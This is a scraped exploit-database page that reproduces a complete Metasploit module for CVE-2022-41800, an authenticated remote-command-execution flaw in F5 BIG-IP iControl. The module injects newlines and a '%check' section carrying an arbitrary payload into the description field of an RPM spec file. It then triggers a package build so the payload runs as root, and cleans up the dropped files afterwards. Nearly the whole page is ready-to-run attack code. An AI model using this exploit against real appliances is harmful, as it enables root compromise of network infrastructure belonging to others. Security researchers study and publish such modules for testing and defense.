---
title: F5 BIG-IP iControl Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2022110048
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-27
fetch_date: 2025-10-03T23:52:31.114594
---

# F5 BIG-IP iControl Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **F5 BIG-IP iControl Remote Command Execution** **2022.11.26**  Credit:  **[Ron Bowes](https://cxsecurity.com/author/Ron%2BBowes/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'F5 BIG-IP iControl Authenticated RCE via RPM Creator',
'Description' => %q{
This module exploits a newline injection into an RPM .rpmspec file
that permits authenticated users to remotely execute commands.
Successful exploitation results in remote code execution
as the root user.
},
'Author' => [
'Ron Bowes' # Discovery, PoC, and module
],
'References' => [
['CVE', '2022-41800'],
['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
['URL', 'https://support.f5.com/csp/article/K97843387'],
['URL', 'https://support.f5.com/csp/article/K13325942'],
],
'License' => MSF\_LICENSE,
'DisclosureDate' => '2022-11-16', # Vendor advisory
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD],
'Privileged' => true,
'Targets' => [
[ 'Default', {} ]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true,
'PrependFork' => true, # Needed to avoid warnings about timeouts and potential failures across attempts.
'MeterpreterTryToFork' => true # Needed to avoid warnings about timeouts and potential failures across attempts.
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION], # One at a time
'SideEffects' => [
IOC\_IN\_LOGS,
ARTIFACTS\_ON\_DISK
]
}
)
)
register\_options(
[
OptString.new('HttpUsername', [true, 'iControl username', 'admin']),
OptString.new('HttpPassword', [true, 'iControl password', ''])
]
)
end
def exploit
# The RPM name is based on these, so we need these to delete the RPM file after
name = rand\_text\_alphanumeric(5..10)
version = "#{rand\_text\_numeric(1)}.#{rand\_text\_numeric(1)}.#{rand\_text\_numeric(1)}"
release = "#{rand\_text\_numeric(1)}.#{rand\_text\_numeric(1)}.#{rand\_text\_numeric(1)}"
vprint\_status('Creating an .rpmspec file on the target...')
result = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/mgmt/shared/iapp/rpm-spec-creator'),
'ctype' => 'application/json',
'authorization' => basic\_auth(datastore['HttpUsername'], datastore['HttpPassword']),
'data' => {
'specFileData' => {
'name' => name,
'srcBasePath' => '/tmp',
'version' => version,
'release' => release,
# This is the injection - add newlines then a '%check' section
'description' => "\n\n%check\n#{payload.encoded}\n",
'summary' => rand\_text\_alphanumeric(5..10)
}
}.to\_json
})
fail\_with(Failure::Unknown, 'Failed to send HTTP request') unless result
fail\_with(Failure::NoAccess, 'Authentication failed') if result.code == 401
fail\_with(Failure::UnexpectedReply, "Server returned an unexpected response: HTTP/#{result.code}") if result.code != 200
json = result&.get\_json\_document
fail\_with(Failure::UnexpectedReply, "Server didn't return valid JSON") unless json
file\_path = json['specFilePath']
fail\_with(Failure::UnexpectedReply, "Server didn't return a specFilePath") unless file\_path
vprint\_status("Created spec file: #{file\_path}")
register\_file\_for\_cleanup(file\_path)
# We can also use `exit 1` in the %check function to prevent this file
# from being created, rather than cleaning it up.. but that seems noisier?
# Neither option gets logged so /shrug
register\_file\_for\_cleanup("/var/config/rest/node/tmp/RPMS/noarch/#{name}-#{version}-#{release}.noarch.rpm")
vprint\_status('Building the RPM to trigger the payload...')
result = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, '/mgmt/shared/iapp/build-package'),
'ctype' => 'application/json',
'authorization' => basic\_auth(datastore['HttpUsername'], datastore['HttpPassword']),
'data' => {
'state' => {},
'appName' => rand\_text\_alphanumeric(5..10),
'packageDirectory' => '/tmp',
'specFilePath' => file\_path
}.to\_json
})
fail\_with(Failure::Unknown, 'Failed to send HTTP request') unless result
fail\_with(Failure::NoAccess, 'Authentication failed') if result.code == 401
fail\_with(Failure::UnexpectedReply, "Server returned an unexpected response: HTTP/#{result.code}") if result.code < 200 || result.code > 299
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110048)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top